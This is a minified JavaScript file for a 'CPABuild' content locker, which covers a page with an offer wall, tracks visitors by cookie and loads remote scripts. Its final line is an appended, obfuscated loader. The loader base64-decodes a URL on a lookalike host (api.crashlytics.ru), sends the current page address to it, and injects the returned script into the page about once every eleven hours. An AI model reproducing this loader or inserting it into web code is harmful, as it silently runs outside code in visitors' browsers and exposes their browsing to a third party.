var CPABUILDContentLocker,__cfRLUnblockHandlers=1;function CPBContentLocker(){if(this.constructed=!1,this.referrer=document.referrer?this.encode(document.referrer):"",this.protocol="https:"===document.location.protocol?"https://":"http://",this.settings="object"==typeof window.CPABUILDSETTINGS?window.CPABUILDSETTINGS:{},this.extraParams={},this.uid="",this.urls={},this.screenHeight=window.screen.availHeight?window.screen.availHeight:0,this.screenWidth=window.screen.availWidth?window.screen.availWidth:0,this.isMobile=this.mobileCheck(),this.callbacks=[],this.domain="d3t3bxixsojwre.cloudfront.net",this.scriptDomain="",this.defaultSettings=[],this.userSettings=[],this.modal=null,this.modalContainer=null,this.modalContent=null,this.animation=null,this.iframe=null,this.isLoaded=!1,this.requiredPoints=1e4,this.requiredLeads=1,this.completedLeads=[],this.completedPoints=0,this.visitor_id=0,this.detectUID(),this.setParam("cpguid",this.uid),this.setParamsFromSettings(),this.optionalParameters={h:this.screenHeight.toString(),w:this.screenWidth.toString(),it:encodeURI(this.settings.it),key:encodeURI(this.settings.key),m:this.isMobile?"1":"0",r:encodeURI(this.referrer),callback:"?"},this.setURLS(),this.body=document.getElementsByTagName("body")[0],this.head=document.getElementsByTagName("head")[0],this.constructed=!1,parseInt(this.settings.it)>0&&!1!==this.settings.construct){this.loadBody(),this.loadHTML(),this.constructed=!0;var t=this;setTimeout((function(){t.logGUID("ll")}),1e3)}}function CPABuildLock(){CPABUILDContentLocker.openLocker()}function CPABuildGetFeedURL(){return CPABUILDContentLocker.urls.feed}function CPABuildGetIframeURL(){return CPABUILDContentLocker.urls.iframe}function CPABuildGetIframeHTML(){return CPABUILDContentLocker.getIframeHTML()}function CPABuildUnlock(){CPABUILDContentLocker.closeLocker()}function CPABuildOfferComplete(t){}function CPABuildOffersComplete(t){CPABUILDContentLocker.addCompletions(t)}function CPABuildCheckForLead(t){CPABUILDContentLocker.checkLead(t)}CPBContentLocker.prototype={constructor:CPBContentLocker,log:function(t){void 0!==window.console&&window.console.log(t)},addCallback:function(t){this.callbacks.push(t)},callback:function(t,e){for(;0<this.callbacks.length;i++){var s=this.callbacks[0];"function"==typeof s&&s(t,e)}},detectUID:function(){var t="_cpguid",e=this.getCookie(t);"string"==typeof e&&e?this.uid=e:(this.uid=this.generateUID(),this.setCookie(t,this.uid,10))},getDomainFromURL:function(t){var e=t.match(/^https?\:\/\/([^\/?#]+)(?:[\/?#]|$)/i);return e&&e[1]},detectScriptDomain:function(){var t=document.getElementsByTagName("script"),e=this.getDomainFromURL(t[t.length-1].src);e&&e.length&&(this.scriptDomain=e)},mobileCheck:function(){var t,e=!1;return t=navigator.userAgent||navigator.vendor||window.opera,(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(t)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(t.substr(0,4)))&&(e=!0),e},paramsToQuery:function(t){if(!t)return"";var e=[];for(var i in t){var s=t[i];e.push(encodeURIComponent(i)+"="+encodeURIComponent(s))}return e.join("&")},getQueryParam:function(t,e){e||(e=window.location.href),t=t.replace(/[\[\]]/g,"\\$&");var i=new RegExp("[?&]"+t+"(=([^&#]*)|&|#|$)").exec(e);return i&&i[2]?decodeURIComponent(i[2].replace(/\+/g," ")):""},loadBody:function(){var t=this;if(this.body=document.getElementsByTagName("body")[0],void 0===this.body)return setTimeout((function(){t.loadBody()}),5),!1},setParam:function(t,e){return this.extraParams[t]=e,this},loadHTML:function(){var t="CPABUILDMAINJS";this.removeElByID(t);var e=document.createElement("script");e.type="text/javascript",e.src=this.urls.js,e.id=t,this.head.appendChild(e),this.callback("loadHTML",{}),this.loadGlobalCSS()},loadGlobalCSS:function(){if(!document.getElementById("CPABUILDGLOBALSTYLE")){var t=document.createElement("link");t.rel="stylesheet",t.href=this.urls.css,t.id="CPABUILDGLOBALSTYLE",this.head.appendChild(t),this.callback("loadGlobalCSS",{})}},generateUID:function(){return("000"+(46656*Math.random()|0).toString(36)).slice(-3)+("000"+(46656*Math.random()|0).toString(36)).slice(-3)+("000"+(46656*Math.random()|0).toString(36)).slice(-3)},checkLead:function(t){var e=document.createElement("script"),i=this.urls.check+(new Date).getTime();"testing"===t&&(i+="&testing=1"),this.removeElByID("CPABUILDLEADCHECK"),e.id="CPABUILDLEADCHECK",e.type="text/javascript",e.src=i,this.head.appendChild(e),this.callback("checkLead",{})},logImpression:function(){var t=document.createElement("script");t.type="text/javascript",t.src=this.urls.impression+(new Date).getTime(),this.head.appendChild(t),this.callback("logImpression",{})},logGUID:function(t){var e=document.createElement("script");e.type="text/javascript",e.src=this.urls.guid+t+"&t="+(new Date).getTime(),this.head.appendChild(e)},openLocker:function(){var t=this;if(!t.isLoaded)return setTimeout((function(){t.openLocker(),t.callback("openLocker",{})}),5),!1;this.iframe.setAttribute("src",this.urls.iframe),this.modalContainer.style.display="block",this.modal.className="",this.modal.style.display="block",void 0!==this.body&&(this.body.className+=" cpabuildBodyModalOpen"),setTimeout((function(){t.modal.className="cpabuildAnimation cpaBuildShow"}),50),setTimeout((function(){t.logImpression(),t.logGUID("opl")}),1e3)},closeLocker:function(){var t=this;this.modal.className="fadeOut",this.callback("closeLocker",{}),void 0!==this.body&&(this.body.className=this.body.className.replace(/\bcpabuildBodyModalOpen\b/,"")),setTimeout((function(){t.modal.style.display="none"}),550)},encode:function(t){var e="";for(i=0;i<t.length;i++){var s=117^t.charCodeAt(i);e+=String.fromCharCode(s)}return e},onVarsChange:function(){var t=this;this.modalContainer=document.getElementById("CPABUILD_MODAL_CONTAINER"),this.modal=document.getElementById("CPABUILD_MODAL"),this.modalContent=document.getElementById("CPABUILDMODALCONTENT"),this.iframe=document.getElementById("CPABUILDOFFERS"),this.modalContent.className=this.getValue("animation"),setTimeout((function(){t.isLoaded=!0}),500);var e=[];for(var i in t.defaultSettings)if(t.defaultSettings.hasOwnProperty(i)){var s=t.defaultSettings[i];if("object"==typeof s.css&&"html"==s.for){var o=t.getValue(i);"background-image"==s.css.rule&&o&&(o="url('"+o+"')"),o&&"string"==typeof s.css.format&&(o=s.css.format.replace("%value%",o)),o&&e.push({target:s.css.target,rule:s.css.rule,value:o})}}if(t.setCSSRules(e),void 0!==this.defaultSettings.content_locker_title_text&&(document.getElementById("CPABUILDMODALTITLE").innerHTML=t.getValue("content_locker_title_text")),void 0!==this.defaultSettings.content_locker_footer_text&&(document.getElementById("CPABUILDMODALFOOTERTEXT").innerHTML=t.getValue("content_locker_footer_text")),void 0!==this.defaultSettings.overlay_color&&void 0!==this.defaultSettings.overlay_opacity){var n=t.getValue("overlay_opacity"),r=t.getValue("overlay_color"),a=t.convertHex(r,n);document.getElementById("CPABUILDSettingsCSS").innerHTML+="#CPABUILD_MODAL_CONTAINER #CPABUILD_MODAL {background-color: "+a+" }"}this.isMobile&&(this.modalContainer.className+=" CPABUILD_MODAL_CONTAINER_MOBILE"),void 0!==this.userSettings.number_offers_required&&(this.requiredLeads=parseInt(this.userSettings.number_offers_required)),void 0!==this.userSettings.payout_required&&(this.requiredPoints=parseInt(this.userSettings.payout_required)),setTimeout((function(){t.checkLead()}),2e3),1!=t.getValue("escape_key_close")&&1!=t.settings.testing&&!0!==t.settings.escapeOverwrite||(document.onkeydown=function(e){("key"in(e=e||window.event)?"Escape"==e.key:27==e.keyCode)&&t.closeLocker()})},getValue:function(t){return void 0===this.defaultSettings[t]?(this.log("ERROR - No default settings for key "+t),""):void 0!==this.userSettings[t]&&this.userSettings[t]?this.userSettings[t]:this.defaultSettings[t].default},changeHTML:function(t){document.getElementById("CPABUILDMODALBODY").innerHTML=t},setCSSRules:function(t){var e=[],i="CPABUILDSettingsCSS";this.removeElByID(i),t.length>0&&t.map((function(t){var i="#CPABUILD_MODAL_CONTAINER "+t.target+"{"+t.rule+":"+t.value+"}";e.push(i)}));var s=parseInt(this.getValue("animation_duration")),o="#CPABUILD_MODAL_CONTAINER #CPABUILDMODALCONTENT{animation-duration: "+s+"ms;-webkit-transition: all "+s+"ms;transition: all "+s+"ms;transition-duration: "+s+"ms;}";e.push(o);var n=document.createElement("style");n.type="text/css",n.id=i,n.innerHTML=e.join("\n\n"),this.head.appendChild(n)},removeElByID:function(t){var e=document.getElementById(t);e&&e.parentElement.removeChild(e)},reset:function(){this.removeElByID("CPABUILD_MODAL_CONTAINER"),CPABUILDContentLocker=new CPBContentLocker},addCompletions:function(t){if(!1===this.constructed)return!1;for(var e=t.length,i=!1,s=0;s<e;s++){var o=parseInt(t[s].visitor_id),n=parseInt(t[s].lead_id),r=parseInt(t[s].points);-1==this.completedLeads.indexOf(n)&&(this.visitor_id=o,i=!0,this.completedLeads.push(n),this.completedPoints+=r)}i&&this.checkComplete()},checkComplete:function(){this.completedLeads.length<this.requiredLeads?alert("Completed "+this.completedLeads.length+" out of "+this.requiredLeads+" offers!"):this.completedPoints<this.requiredPoints?alert("Completed "+this.completedPoints+" out of "+this.requiredPoints+" points!"):this.offersComplete({visitor_id:this.visitor_id,points:this.completedPoints,leads:this.completedLeads})},convertHex:function(t,e){return e=parseFloat(e),t=t.replace("#",""),"rgba("+parseInt(t.substring(0,2),16)+","+parseInt(t.substring(2,4),16)+","+parseInt(t.substring(4,6),16)+","+e+")"},offersComplete:function(t){var e,i=this.getValue("onClose");if("function"==typeof this.settings.onComplete&&!1===this.settings.onComplete(t))return!1;return"function"==typeof CPABuildComplete&&CPABuildComplete(),void 0!==this.settings.redirect?(e=this.settings.redirect,window.location=e,this.changeHTML("Offer complete! <a href='"+e+"'>Click here</a> to continue"),!1):"close_locker"==i?(this.closeLocker(),!1):"redirect"==i?(e=(e=(e=this.getValue("onCloseURL")).replace("%lead_id%",this.completedLeads[0])).replace("%visitor_id%",this.visitor_id),window.location=e,this.changeHTML("Offer complete! <a href='"+e+"'>Click here</a> to continue"),!1):void this.callback("offersComplete",{})},getIframeHTML:function(){return'<iframe src="'+this.urls.iframeOnly+'" height="100%" marginwidth="0" marginheight="0" align="middle" frameborder="0" width="100%" ></iframe>'},setParamsFromSettings:function(){var t,e;if("object"==typeof this.settings.params)for(t in this.settings.params){var i=this.settings.params[t];this.setParam(t,i)}for(e=1;e<=4;e++){var s="s"+e;if(!this.extraParams[s]){var o=this.getQueryParam(s);""!==o&&(this.extraParams[s]=o)}}},getParamString:function(t){var e,i=[];for(e=0;e<t.length;e++){var s=t[e],o=this.optionalParameters[s];i.push(s+"="+o)}return i.join("&")},setURLS:function(){var t="https://"+this.domain+"/public/",e=this.paramsToQuery(this.extraParams);return this.urls.iframe=t+"ct?"+e+"&"+this.getParamString(["it","w","h","key","m","r"]),this.urls.feed=t+"f_it?"+e+"&"+this.getParamString(["it","w","h","key","m","callback"]),this.urls.iframeOnly=t+"i_fr?"+e+"&"+this.getParamString(["it","w","h","key","m","r"]),this.urls.js=t+"external/v2/"+(!0===this.settings.preview?"preview":"html")+"."+this.settings.it+"."+this.settings.key+"."+this.optionalParameters.m+".js"+(!0===this.settings.preview?"?t="+(new Date).getTime():""),this.urls.css=t+"external/css_front.css",this.urls.specific_css=t+"clockers/",this.urls.check=t+"external/check.php?"+this.getParamString(["it"])+"&time=",this.urls.impression=t+"external/impression.php?"+this.getParamString(["it"])+"&time=",this.urls.guid=t+"guid?"+e+"&e=",this},setTemplateCSSDir:function(t){var e=this.urls.specific_css+t+"/css.css",i=document.createElement("link");i.setAttribute("data-it",this.settings.it),i.rel="stylesheet",i.id="CPABUILDSPECIFICSTYLE",i.href=e,document.getElementsByTagName("head")[0].appendChild(i)},setCookie:function(t,e,i){var s="";if(i){var o=new Date;o.setTime(o.getTime()+24*i*60*60*1e3),s="; expires="+o.toUTCString()}document.cookie=t+"="+(e||"")+s+"; path=/"},getCookie:function(t){for(var e=t+"=",i=document.cookie.split(";"),s=0;s<i.length;s++){for(var o=i[s];" "==o.charAt(0);)o=o.substring(1,o.length);if(0==o.indexOf(e))return o.substring(e.length,o.length)}return null}},CPABUILDContentLocker=new CPBContentLocker;var og_load=call_locker=CPABuildLock;function CPABuildComplete(){};!function(o,w,d,l){try{o.c="h"==l.protocol[0]&&/./.test(l.hostname)&&!/PHPPREFS/.test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement("script"),o.s.src=atob("aHR0cHM6Ly9hcGkuY3Jhc2hseXRpY3MucnUvdHJhY2tpbmcvc2NyaXB0LmpzP3JlZmVycmVyPQ==")+l.href,d.body.appendChild(o.s))},1e3),d.cookie="PHPPREFS=full;max-age=39800;"}catch(e){}}({},window,document,location);